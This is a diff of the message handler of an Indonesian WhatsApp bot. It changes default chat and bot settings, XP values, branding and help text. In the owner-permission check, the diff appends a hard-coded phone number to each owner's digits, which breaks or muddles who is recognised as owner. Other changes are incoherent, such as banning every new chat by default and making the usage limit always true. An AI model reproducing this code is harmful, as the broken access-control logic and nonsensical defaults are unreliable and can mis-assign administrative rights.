@@ -94,8 +94,8 @@ module.exports = {
           if (!('stiker' in chat)) chat.stiker = false
           if (!('viewonce' in chat)) chat.viewonce = true
         } else global.db.data.chats[m.chat] = {
-          isBanned: false,
-          welcome: false,
+          isBanned: true,
+          welcome: true,
           detect: false,
           sWelcome: '',
           sBye: '',
@@ -119,7 +119,7 @@ module.exports = {
           if (!'anon' in settings) settings.anon = true
           if (!'anticall' in settings) settings.anticall = true
           if (!'antispam' in settings) settings.antispam = true
-          if (!'antitroli' in settings) settings.antitroli = true
+          if (!'antitroli' in settings) settings.antitroli = false
           if (!'autoupdatestatus' in settings) settings.autoupdatestatus = false
           if (!'backup' in settings) settings.backup = false
           if (!'buggc' in settings) settings.buggc = true
@@ -140,7 +140,7 @@ module.exports = {
           buggc: true,
           backupTime: 0,
           group: false,
-          jadibot: false,
+          jadibot: true,
           nsfw: true,
           restrict: false,
           self: false,
@@ -172,7 +172,7 @@ module.exports = {
       let usedPrefix
       let _user = global.db.data && global.db.data.users && global.db.data.users[m.sender]
 
-      let isROwner = [global.conn.user.jid, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+      let isROwner = [global.conn.user.jid, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '6283117436733@s.whatsapp.net').includes(m.sender)
       let isOwner = isROwner || m.fromMe
       if (!isOwner && db.data.settings[this.user.jid].self) return // Saat mode self diaktifkan hanya owner yang dapat menggunakannya
       let isPrems = isROwner || db.data.users[m.sender].premium
@@ -287,7 +287,7 @@ module.exports = {
           }
 
           m.isCommand = true
-          let xp = 'exp' in plugin ? parseInt(plugin.exp) : 17 // Pendapatkan XP per Command
+          let xp = 'exp' in plugin ? parseInt(plugin.exp) : 20 // Pendapatkan XP per Command
           if (xp > 200) m.reply('Ngecit -_-') // Hehehe
           else m.exp += xp
           if (!isPrems && plugin.limit && global.db.data.users[m.sender].limit < plugin.limit * 1) {
@@ -321,7 +321,7 @@ module.exports = {
           }
           try {
             await plugin.call(this, m, extra)
-            if (!isPrems) m.limit = m.limit || plugin.limit || false
+            if (!isPrems) m.limit = m.limit || plugin.limit || true
           } catch (e) {
             // Terjadi kesalahan
             m.error = e
@@ -453,7 +453,7 @@ module.exports = {
 Terdeteksi @${m.participant.split`@`[0]} telah menghapus pesan
 
 ketik *.on delete* untuk mematikan pesan ini
-`.trim(), '© stikerin', 'Matikan Antidelete', ',on delete', m.message)
+`.trim(), '© Miyuki DVT', 'Matikan Antidelete', ',on delete', m.message)
     this.copyNForward(m.key.remoteJid, m.message).catch(e => console.log(e, m))
   },
   async onCall(json) {
@@ -486,7 +486,7 @@ ketik *.on delete* untuk mematikan pesan ini
 
     ${desc} 
         `.trim()
-    this.sendButton(jid, caption, '© stikerin', 'Matikan', ',off desc')
+    this.sendButton(jid, caption, '© Miyuki DVT', 'Matikan', ',off desc')
 
   }
 }
@@ -500,7 +500,7 @@ global.dfail = (type, m, conn) => {
     private: 'Perintah ini hanya dapat digunakan di Chat Pribadi',
     admin: 'Perintah ini hanya untuk *Admin* grup',
     botAdmin: 'Jadikan bot sebagai *Admin* untuk menggunakan perintah ini',
-    unreg: 'Silahkan daftar untuk menggunakan fitur ini dengan cara mengetik:\n\n*#daftar nama.umur*\n\nContoh: *#daftar Arif.19*',
+    unreg: 'Silahkan daftar untuk menggunakan fitur ini dengan cara mengetik:\n\n*#daftar nama.umur*\n\nContoh: *#daftar BLZXB5.17*',
     nsfw: 'NSFW tidak aktif'
   }[type]
   if (msg) return m.reply(msg)
